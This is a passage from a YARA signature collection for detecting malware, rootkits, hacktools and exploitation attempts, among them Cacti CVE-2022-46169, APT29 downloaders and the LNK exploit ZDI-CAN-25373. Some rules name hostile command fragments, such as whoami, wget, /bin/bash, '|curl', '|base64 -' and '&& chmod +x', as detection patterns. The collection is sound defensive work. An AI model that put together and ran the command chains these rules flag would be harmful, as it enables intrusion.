		hash = "b40297af54e3f99b02e105f013265fd8d0a1b1e1f7f0b05bcb5dbdc9125b3bb5"
		hash = "b7644fa1e0872780690ce050c98aa2407c093473031ab5f7a8ce35c0d2fc077e"
		logic_hash = "f8047eb4e0420e4ec01fb038acdc4abdcc3aa4dada5ce072d20f78acac942079"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "requests.get(\"https://anti-theft-web.herokuapp.com/hacked/"

	condition:
		filesize < 10KB and $x1
}
rule SIGNATURE_BASE_EXPL_LOG_Cacti_Commandinjection_CVE_2022_46169_Dec22_1 : CVE_2022_46169
{
	meta:
		description = "Detects potential exploitation attempts that target the Cacti Command Injection CVE-2022-46169"
		author = "Nasreddine Bencherchali"
		id = "c799a419-87ed-55ea-8ebb-d4da901be4ad"
		date = "2022-12-27"
		modified = "2023-12-05"
		reference = "https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_cve_2022_46169_cacti.yar#L1-L13"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "6ccd3b830deb5c5d65519274c4c528203a2a14a177382334da87e288174e2cfe"
		score = 70
		quality = 85
		tags = "CVE-2022-46169"

	strings:
		$xr1 = /\/remote_agent\.php.{1,300}(whoami|\/bin\/bash|\/bin\/sh|\bwget\b|powershell|cmd \/c|cmd\.exe \/c).{1,300} 200 / ascii

	condition:
		$xr1
}
rule SIGNATURE_BASE_SUSP_LNK_Suspicious_Folders_Jan25 : FILE
{
	meta:
		description = "Detects link files (.LNK) with suspicious folders mentioned in the target path"
		author = "Florian Roth"
		id = "5f1bcd18-abec-5831-b24f-519c92a2454e"
		date = "2025-01-24"
		modified = "2025-03-20"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mixed_open_source_export.yar#L2-L16"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "776adb706e165389d0abdf8d6f719f6db1ec6d2f3d9d96e1c4a5f2b55e482c31"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "RECYCLER.BIN\\" wide
		$x2 = "Perflogs\\" wide

	condition:
		uint16( 0 ) == 0x004c and 1 of them
}
rule SIGNATURE_BASE_M_APT_Downloader_BEATDROP : FILE
{
	meta:
		description = "Rule looking for BEATDROP malware"
		author = "Mandiant"
		id = "5720870e-8989-59f2-998b-019084d091ce"
		date = "2022-04-28"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/tracking-apt29-phishing-campaigns"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_apt29_nobelium_apr22.yar#L1-L17"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "7a766682cc9a057798cc569111bfcb611648c4a052c0dd664d983b80d5891255"
		score = 90
		quality = 85
		tags = "FILE"

	strings:
		$ntdll1 = "ntdll" ascii fullword
		$ntdll2 = "C:\\Windows\\System32\\ntdll.dll" ascii fullword nocase
		$url1 = "api.trello.com" ascii
		$url2 = "/members/me/boards?key=" ascii
		$url3 = "/cards?key=" ascii

	condition:
		uint16( 0 ) == 0x5a4d and uint32( uint32( 0x3C ) ) == 0x00004550 and filesize < 1MB and all of them
}
rule SIGNATURE_BASE_M_APT_Downloader_BOOMMIC : FILE
{
	meta:
		description = "Rule looking for BOOMMIC malware"
		author = "Mandiant"
		id = "34ea08a6-5d6f-5cdd-a629-fa36313c98f7"
		date = "2022-04-28"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/tracking-apt29-phishing-campaigns"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_apt29_nobelium_apr22.yar#L19-L38"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "c561b19464597f896d31307c0383fbc639cf4211600513e1251a3f59405bfed6"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$loc_10001000 = { 55 8B EC 8D 45 0C 50 8B 4D 08 51 6A 02 FF 15 [4] 85 C0 74 09 B8 01 00 00 00 EB 04 EB 02 33 C0 5D C3 }
		$loc_100012fd = {6A 00 8D 55 EC 52 8B 45 D4 50 6A 05 8B 4D E4 51 FF 15 }
		$func1 = "GetComputerNameExA" ascii
		$func2 = "HttpQueryInfoA" ascii

	condition:
		uint16( 0 ) == 0x5a4d and uint32( uint32( 0x3C ) ) == 0x00004550 and filesize < 1MB and ( ( $loc_10001000 and $func1 ) or ( $loc_100012fd and $func2 ) )
}
rule SIGNATURE_BASE_HKTL_Redmimicry_Agent
{
	meta:
		description = "matches the RedMimicry agent executable and payload"
		author = "mirar@chaosmail.org"
		id = "a4d4ec77-4a0d-5afd-9181-85433e8b5fda"
		date = "2020-06-22"
		modified = "2023-01-06"
		reference = "https://redmimicry.com"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_redmimicry.yar#L2-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "645da2764ca911c4aae80b90622d2c61933dee929403858fc49f7bc0d44300c6"
		score = 75
		quality = 85
		tags = ""
		sharing = "tlp:white"

	strings:
		$reg0 = "HKEY_CURRENT_USER\\" ascii
		$reg1 = "HKEY_LOCAL_MACHINE\\" ascii
		$reg2 = "HKEY_CURRENT_CONFIG\\" ascii
		$reg3 = "HKEY_CLASSES_ROOT\\" ascii
		$cmd0 = "C:\\Windows\\System32\\cmd.exe" ascii fullword
		$lua0 = "client_recv" ascii fullword
		$lua1 = "client_send" ascii fullword
		$lua2 = "$LuaVersion: " ascii
		$sym0 = "VirtualAllocEx" wide fullword
		$sym1 = "kernel32.dll" wide fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_HKTL_Redmimicry_Winntiloader
{
	meta:
		description = "matches the Winnti 'Cooper' loader version used for the RedMimicry breach emulation"
		author = "mirar@chaosmail.org"
		id = "a8be1377-faa0-560d-a12c-0369b1f91180"
		date = "2020-06-22"
		modified = "2023-01-10"
		reference = "https://redmimicry.com"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_redmimicry.yar#L28-L59"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "d8ef457ac41a7c45cc7e97330bdd3de12eb3391c03d0a6a87ddc669c841c325d"
		score = 75
		quality = 85
		tags = ""
		sharing = "tlp:white"

	strings:
		$s0 = "Cooper" ascii fullword
		$s1 = "stone64.dll" ascii fullword
		$decoding_loop = { 49 63 D0 43 8D 0C 01 41 FF C0 42 32 0C 1A 0F B6 C1 C0 E9 04 C0 E0 04 02 C1 42 88 04 1A 44 3B 03 72 DE }

	condition:
		all of them
}
rule SIGNATURE_BASE_SUSP_VEST_Encryption_Core_Accumulator_Jan21 : FILE
{
	meta:
		description = "Detects VEST encryption core accumulator in PE file as used by Lazarus malware"
		author = "Florian Roth (Nextron Systems)"
		id = "8343652b-8865-5213-b735-d6d4084e4a84"
		date = "2021-01-28"
		modified = "2023-12-05"
		reference = "https://twitter.com/ochsenmeier/status/1354737155495649280"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_lazarus_jan21.yar#L2-L25"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "7cd3ca8bdfb44e98a4b9d0c6ad77546e03d169bda9bdf3d1bcf339f68137af23"
		logic_hash = "41fe42b2f2b5fb54b7ff19b74a35aadd928be9a3c7280ee9feffc4a142924b07"
		score = 70
		quality = 85
		tags = "FILE"

	strings:
		$sc1 = { 4F 70 46 DA E1 8D F6 41 59 E8 5D 26 1E CC 2F 89
               26 6D 52 BA BC 11 6B A9 C6 47 E4 9C 1E B6 65 A2
               B6 CD 90 47 1C DF F8 10 4B D2 7C C4 72 25 C6 97
               25 5D C6 1D 4B 36 BC 38 36 33 F8 89 B4 4C 65 A7
               96 CA 1B 63 C3 4B 6A 63 DC 85 4C 57 EE 2A 05 C7
               0C E7 39 35 8A C1 BF 13 D9 52 51 3D 2E 41 F5 72
               85 23 FE A1 AA 53 61 3B 25 5F 62 B4 36 EE 2A 51
               AF 18 8E 9A C6 CF C4 07 4A 9B 25 9B 76 62 0E 3E
               96 3A A7 64 23 6B B6 19 BC 2D 40 D7 36 3E E2 85
               9A D1 22 9F BC 30 15 9F C2 5D F1 23 E6 3A 73 C0 }

	condition:
		uint16( 0 ) == 0x5a4d and 1 of them
}
rule SIGNATURE_BASE_HKTL_Rusthound : FILE
{
	meta:
		description = "Detect hacktool RustHound (Sharphound clone)"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "d2fd79a5-9a1a-51de-920c-61653c8b0064"
		date = "2023-03-30"
		modified = "2026-10-29"
		reference = "https://github.com/OPENCYBER-FR/RustHound"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/thor-hacktools.yar#L4683-L4710"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "409f61a34d9771643246f401a9670f6f7dcced9df50cbd89a2e1a5c9ba8d03ab"
		hash = "b1a58a9c94b1df97a243e6c3fc2d04ffd92bc802edc7d8e738573b394be331a9"
		hash = "170f4a48911f3ebef674aade05184ea0a6b1f6b089bcffd658e95b9905423365"
		hash = "e52f6496b863b08296bf602e92a090768e86abf498183aa5b6531a3a2d9c0bdb"
		hash = "847e57a35df29d40858c248e5b278b09cfa89dd4201cb24262c6158395e2e585"
		hash = "4edfed92b54d32a58b2cfc926f98a56637e89850410706abcc469a8bc846bc85"
		hash = "feba0c16830ea0a13819a9ab8a221cc64d5a9b3cc73f3c66c405a171a2069cc1"
		hash = "21d37c2393a6f748fe34c9d2f52693cb081b63c3a02ca0bebe4a584076f5886c"
		hash = "874a1a186eb5808d456ce86295cd5f09d6c819375acb100573c2103608af0d84"
		hash = "bf576bd229393010b2bb4ba17e49604109e294ca38cf19647fc7d9c325f7bcd1"
		logic_hash = "386b734ad7f3cf02f096236c941033b3f905a3368b8a72dd63e91e6e94f12f8d"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$rh1 = "rusthound" fullword ascii wide
		$rh2 = "Making json/zip files finished!" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D or uint16( 0 ) == 0x457f ) and 1 of ( $rh* )
}
rule SIGNATURE_BASE_MAL_Netfilter_Dropper_Jun_2021_1 : FILE
{
	meta:
		description = "Detects the dropper of Netfilter rootkit"
		author = "Arkbird_SOLG"
		id = "d91f48aa-9580-572d-a72c-19b80624cdbe"
		date = "2020-06-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/struppigel/status/1405483373280235520"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_cn_netfilter.yar#L4-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "a5c873085f36f69f29bb8895eb199d42ce86b16da62c56680917149b97e6dac"
		hash = "659e0d1b2405cadfa560fe648cbf6866720dd40bb6f4081d3dce2dffe20595d9"
		hash = "d0a03a8905c4f695843bc4e9f2dd062b8fd7b0b00103236b5187ff3730750540"
		logic_hash = "b70eb5d2d234d0f523c41fa146f315cf7239bbe7a988b393e75ea6cf6aa438d3"
		score = 75
		quality = 85
		tags = "FILE"
		tlp = "White"
		adversary = "Chinese APT Group"

	strings:
		$seq1 = { b8 ff 00 00 00 50 b8 00 00 00 00 50 8d 85 dd fe ff ff 50 e8 ?? 0d 00 00 83 c4 0c b8 00 00 00 00 88 85 dc fd ff ff b8 ff 00 00 00 50 b8 00 00 00 00 50 8d 85 dd fd ff ff 50 e8 ?? 0d 00 00 83 c4 0c b8 00 00 50 00 50 e8 ?? 0d 00 00 83 c4 04 89 85 d8 fd ff ff 8b 85 d8 fd ff ff 89 85 d4 fd ff ff b8 00 00 50 00 50 b8 00 00 00 00 50 8b 85 d8 fd ff ff 50 e8 ?? 0c 00 00 83 c4 0c 8b 45 0c 8b 8d d8 fd ff ff 89 08 b8 3c 00 00 00 50 b8 00 00 00 00 50 8d 85 98 fd ff ff 50 e8 ?? 0c 00 00 83 c4 0c b8 3c 00 00 00 89 85 98 fd ff ff 8d 85 98 fd ff ff 83 c0 10 8d 8d dc fe ff ff 89 08 8d 85 98 fd ff ff 83 c0 14 b9 00 01 00 00 89 08 8d 85 98 fd ff ff 83 c0 2c 8d 8d dc fd ff ff 89 08 8d 85 98 fd ff ff 83 c0 30 b9 00 01 00 00 89 08 b8 0a 31 40 00 50 e8 ?? 0c 00 00 89 85 94 fd ff ff b8 16 31 40 00 50 8b 85 94 fd ff ff 50 e8 ?? 0c 00 00 89 45 fc b8 28 31 40 00 50 8b 85 94 fd ff ff 50 e8 ?? 0c 00 00 89 45 f8 b8 36 31 40 00 50 8b 85 94 fd ff ff 50 e8 [2] 00 00 89 45 f4 b8 47 31 40 00 50 8b 85 94 fd ff ff 50 e8 [2] 00 00 89 45 f0 b8 58 31 40 00 50 8b 85 94 fd ff ff 50 e8 ?? 0b 00 00 89 45 ec b8 69 31 40 00 50 8b 85 94 fd ff ff 50 e8 ?? 0b 00 00 89 45 e8 b8 7a 31 40 00 50 8b 85 94 fd ff ff 50 e8 ?? 0b 00 00 89 45 e4 b8 8e 31 40 00 50 8b 85 94 fd ff ff 50 e8 ?? 0b 00 00 89 45 e0 8b 45 08 50 e8 ?? 0b 00 00 83 c4 04 8d 8d 98 fd ff ff 51 b9 00 00 00 00 51 50 8b 45 08 50 8b 45 fc ff d0 85 }
		$seq2 = { b8 00 00 00 00 89 85 90 fd ff ff b8 00 00 00 00 89 85 8c fd ff ff b8 00 00 00 00 89 85 88 fd ff ff b8 00 00 00 00 89 85 84 fd ff ff b8 04 00 00 00 89 85 80 fd ff ff b8 00 00 00 00 88 85 7f f5 ff ff b8 00 08 00 00 50 b8 00 00 00 00 50 8d 85 80 f5 ff ff 50 e8 ?? 0b 00 00 83 c4 0c b8 00 00 00 00 50 b8 00 00 00 00 50 b8 00 00 00 00 50 b8 00 00 00 00 50 b8 9d 31 40 00 50 8b 45 f8 ff d0 89 85 90 fd ff ff 8b 85 }
		$s1 = "%s\\netfilter.sys" fullword ascii
		$s2 = "SYSTEM\\CurrentControlSet\\Services\\netfilter" fullword ascii
		$s3 = "\\\\.\\netfilter" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and filesize > 6KB and filesize < 1000KB and ( all of ( $seq* ) or 2 of ( $s* ) )
}
rule SIGNATURE_BASE_MAL_Netfilter_May_2021_1 : FILE
{
	meta:
		description = "Detects Netfilter rootkit"
		author = "Arkbird_SOLG"
		id = "0ac01eb3-435b-52b0-b8e8-ace2ebb34f60"
		date = "2020-06-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/struppigel/status/1405483373280235520"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_cn_netfilter.yar#L28-L52"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "63d61549030fcf46ff1dc138122580b4364f0fe99e6b068bc6a3d6903656aff0"
		hash = "8249e9c0ac0840a36d9a5b9ff3e217198a2f533159acd4bf3d9b0132cc079870"
		hash = "d64f906376f21677d0585e93dae8b36248f94be7091b01fd1d4381916a326afe"
		logic_hash = "ba72bbc38c27d0c8d6eea7d513c3ca40276edd929c93abae4098639f7d7649a5"
		score = 75
		quality = 83
		tags = "FILE"
		tlp = "White"
		adversary = "Chinese APT Group"

	strings:
		$seq1 = { 48 8b 05 a9 57 ff ff 45 33 c9 49 b8 32 a2 df 2d 99 2b 00 00 48 85 c0 74 05 49 3b c0 75 38 0f 31 48 c1 e2 20 48 8d 0d 85 57 ff ff 48 0b c2 48 33 c1 48 89 05 78 57 ff ff 66 44 89 0d 76 57 ff ff 48 8b 05 69 57 ff ff 48 85 c0 75 0a 49 8b c0 48 89 05 5a 57 ff ff 48 f7 d0 48 89 05 58 57 }
		$seq2 = { 48 83 ec 38 48 83 64 24 20 00 48 8d 05 83 4c 00 00 48 8d 15 24 d1 00 00 48 89 44 24 28 48 8d 4c 24 20 e8 4d 05 00 00 85 c0 78 16 4c 8d 05 22 d1 00 00 83 ca ff 48 8d 0d 00 d1 00 00 e8 39 05 00 00 48 83 c4 }
		$seq3 = { 45 33 c0 48 8d 4c 24 40 41 8d 50 01 ff 15 5d 62 00 00 c6 84 24 88 00 00 00 01 48 8d 84 24 88 00 00 00 48 89 46 18 48 8d 0d e2 fe ff ff 48 89 9e c0 00 00 00 48 8d 44 24 40 48 89 46 50 48 8d 44 24 30 48 89 46 48 65 48 8b 04 25 88 01 00 00 48 89 86 98 00 00 00 48 8b 86 b8 00 00 00 40 88 7e 40 c6 40 b8 06 4c 89 78 e0 48 89 58 e8 c7 40 c0 01 00 00 00 c7 40 c8 0d 00 00 00 48 89 58 d0 48 8b 86 b8 00 00 00 48 89 48 f0 48 8d 4c 24 40 48 89 48 f8 c6 40 bb e0 48 8b 43 28 48 85 c0 74 2f 48 8b 48 10 48 85 c9 74 07 48 21 78 10 4c 8b f1 48 8b 08 48 85 c9 74 06 48 21 38 48 8b e9 48 8b 48 08 48 85 c9 74 08 48 83 60 08 00 48 8b f9 48 8b d6 49 8b cf ff 15 74 61 00 00 3d 03 01 00 00 75 19 48 83 64 24 20 00 48 8d 4c 24 40 41 b1 01 45 33 c0 33 d2 ff 15 64 61 00 00 48 8b 43 28 48 85 c0 74 1a 4d }
		$seq4 = { 8b 84 24 80 00 00 00 48 8d 54 24 38 48 8b 4c 24 30 44 8b ce 89 44 24 28 45 33 c0 48 89 7c 24 20 ff 15 66 2e 00 00 48 8b 4c 24 30 8b d8 ff 15 49 2e 00 00 48 8b 4c 24 30 ff 15 26 2d 00 00 8b }
		$s1 = "%sc=%s" fullword ascii
		$s2 = { 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 25 30 32 78 }
		$s3 = "NETIO.SYS" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and filesize > 20KB and filesize < 1000KB and ( 3 of ( $seq* ) or 2 of ( $s* ) )
}
rule SIGNATURE_BASE_Gen_Excel_Xor_Obfuscation_Velvetsweatshop : FILE
{
	meta:
		description = "Detects XOR encryption (c. 2003) in Excel file formats"
		author = "@JohnLaTwc"
		id = "8a16105c-4f43-5a35-941c-6ee9593b039c"
		date = "2020-10-09"
		modified = "2023-12-05"
		reference = "https://twitter.com/BouncyHat/status/1308896366782042113"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_excel_xor_obfuscation_velvetsweatshop.yar#L3-L25"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "da1999c23ee2dae02a169fd2208b9766cb8f046a895f5f52bed45615eea94da0"
		hash = "14a32b8a504db3775e793be59d7bd5b584ea732c3ca060b2398137efbfd18d5a"
		hash = "dd3e89e7bde993f6f1b280f2bf933a5cc2797f4e8736aed4010aaf46e9854f23"
		hash = "4e40253b382b20e273edf82362f1c89e916f7ab8d3c518818a76cb6127d4e7c2"
		logic_hash = "c38d56199d34adfc98d8032321239ab20c6eaa8abcafd56f8e1cf24fd3a4094f"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$olemarker = { D0 CF 11 E0 A1 B1 1A E1 00 00 00 }
		$FilePass_XOR_Obfuscation_VelvetSweatshop = { 2F 00 06 00 00 00 59 B3 0A 9A }

	condition:
		uint32( 0 ) == 0xe011cfd0 and filesize < 400KB and $olemarker at 0 and $FilePass_XOR_Obfuscation_VelvetSweatshop
}
rule SIGNATURE_BASE_SUSP_LNX_Linux_Malware_Indicators_Aug20_1 : FILE
{
	meta:
		description = "Detects indicators often found in linux malware samples. Note: This detection is based on common characteristics typically associated with the mentioned threats, must be considered a clue and does not conclusively prove maliciousness."
		author = "Florian Roth (Nextron Systems)"
		id = "9a1093a6-0239-5d1c-aa30-1ca725941583"
		date = "2020-08-03"
		modified = "2026-01-04"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_lnx_malware_indicators.yar#L1-L25"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "1d07d424f2a66b60e55d21dff6d4c4f9f2591c3ab622dcfbc1cd989d28b44017"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "&& chmod +x" ascii
		$s2 = "|base64 -" ascii
		$s3 = " /tmp" ascii
		$s4 = "|curl " ascii
		$s5 = "whoami" ascii fullword
		$fp1 = "WITHOUT ANY WARRANTY" ascii
		$fp2 = "postinst" ascii fullword
		$fp3 = "THIS SOFTWARE IS PROVIDED" ascii fullword
		$fp4 = "Free Software Foundation" ascii fullword
		$fp5 = "Too many sessions open! Use ssh_channel.close() or 'with'!"

	condition:
		filesize < 400KB and 3 of ( $s* ) and not 1 of ( $fp* )
}
rule SIGNATURE_BASE_EXT_EXPL_ZTH_LNK_EXPLOIT_A : FILE
{
	meta:
		description = "This YARA file detects padded LNK files designed to exploit ZDI-CAN-25373."
		author = "Peter Girnus"
		id = "14788504-64e3-533b-ad21-00a3462a33cc"
		date = "2025-03-18"
		modified = "2025-03-29"
		reference = "https://www.trendmicro.com/en_us/research/25/c/windows-shortcut-zero-day-exploit.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_lnk_zdi_can_25373.yar#L1-L23"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "b2c6a7f0abd62d3eef916352f984d1fcc721cfba4f5de9d159de8fd428c02b31"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$spoof_a = {20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00}
		$spoof_b = {09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00 09 00}
		$spoof_c = {0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00 0A 00}
		$spoof_d = {0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00 0D 00}
		$spoof_e = {11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00 11 00}
		$spoof_f = {12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00 12 00}
		$spoof_g = {13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00 13 00}
		$spoof_h = {0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00 0D 00 0A 00}

	condition:
		uint32( 0 ) == 0x4C and uint32( 4 ) == 0x21401 and any of ( $spoof_* )
}
rule SIGNATURE_BASE_SUSP_JAVA_Loader_Indicators_Aug25 : FILE
{
	meta:
		description = "Detects indicators of a Java loader used in phishing campaigns"
		author = "Florian Roth"
		id = "ed83b697-4e48-504c-8a65-af0a5b765c9d"
		date = "2025-08-07"
		modified = "2026-05-15"
		reference = "https://www.malwation.com/blog/technical-analysis-of-a-stealth-java-loader-used-in-phishing-campaigns-targeting-turkiye"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_soupdealer_java_aug25.yar#L26-L45"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "c4cf746fce283878dde567e5457a8ebdbb7ff3414be46569ecdd57338bd96fa1"
		logic_hash = "ac610cd6d3030f49058d5e6f059b746cf3da05ca3cdc8f2be2f5f1cfec2ff665"
		score = 70
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "Loader.classPK" ascii fullword
		$s2 = "stubPK" ascii
		$s3 = "META-INF/MANIFEST.MFPK" ascii

	condition:
		uint16( 0 ) == 0x4b50 and filesize < 500KB and $s1 in ( filesize - 224 .. filesize ) and $s2 in ( filesize - 224 .. filesize ) and $s3 in ( filesize - 224 .. filesize )
}
rule SIGNATURE_BASE_MAL_JAVA_Loader_Final_Jar_Aug25
{
	meta:
		description = "Detects a final Java loader JAR file used in phishing campaigns"
		author = "Florian Roth"
		id = "17894519-060b-5414-8430-d6d025e7db83"
		date = "2025-08-07"
		modified = "2026-05-15"
		reference = "https://www.malwation.com/blog/technical-analysis-of-a-stealth-java-loader-used-in-phishing-campaigns-targeting-turkiye"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_soupdealer_java_aug25.yar#L47-L63"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "0a7fddd91b332c8daee2c0727b884fc92cfaede02883dbad75f7efc299e884e3"
		logic_hash = "743e7e12afd949aacbbfcfc62b13d4e65b7011ca4301b37b71bc8032f96aff20"
		score = 85
		quality = 85
		tags = ""

	strings:
		$s1 = "Obfuscation by Allatori Obfuscator" ascii fullword
		$s2 = "MANIFEST.MFM" ascii fullword
		$s3 = "GetCpu.classPK" ascii fullword
		$s4 = "extra/spreader" ascii fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_APT_LNX_Academic_Camp_May20_Eraser_1 : FILE
{
	meta:
		description = "Detects malware used in attack on academic data centers"
		author = "Florian Roth (Nextron Systems)"
		id = "36d17887-9844-5fa4-8a0d-89cc41b2d876"
		date = "2020-05-16"
		modified = "2023-12-05"
		reference = "https://csirt.egi.eu/academic-data-centers-abused-for-crypto-currency-mining/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_academic_data_centers_camp_may20.yar#L1-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "552245645cc49087dfbc827d069fa678626b946f4b71cb35fa4a49becd971363"
		logic_hash = "9a0410e86fa8fb8b599e5b8a6508d6889eb6e26600f0ecf222561ac4a169676d"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$sc2 = { E6 FF FF 48 89 45 D0 8B 45 E0 BA 00 00 00 00 BE
               00 00 00 00 89 C7 E8 }
		$sc3 = { E6 FF FF 89 45 DC 8B 45 DC 83 C0 01 48 98 BE 01
               00 00 00 48 89 C7 E8 }

	condition:
		uint16( 0 ) == 0x457f and filesize < 60KB and all of them
}
rule SIGNATURE_BASE_APT_LNX_Academic_Camp_May20_Loader_1 : FILE
{
	meta:
		description = "Detects malware used in attack on academic data centers"
		author = "Florian Roth (Nextron Systems)"
		id = "cda65abd-d918-5ee6-8f4a-554d47532d76"
		date = "2020-05-16"
